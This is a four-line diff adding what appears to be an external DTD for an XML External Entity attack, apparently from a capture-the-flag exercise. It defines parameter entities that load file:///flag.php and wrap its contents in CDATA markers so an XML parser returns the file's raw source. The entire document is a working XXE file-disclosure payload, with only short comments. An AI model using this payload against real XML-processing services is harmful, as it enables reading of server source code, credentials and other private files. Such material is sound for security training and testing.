@@ -1,0 +1,4 @@
+<!ENTITY % begin "<![CDATA[">  <!-- beginning of our CDATA tag -->
+<!ENTITY % file SYSTEM "file:///flag.php">  <!-- the file data -->
+<!ENTITY % end "]]>">  <!-- end of CDATA tag -->
+<!ENTITY joined '%begin;%file;%end;'>
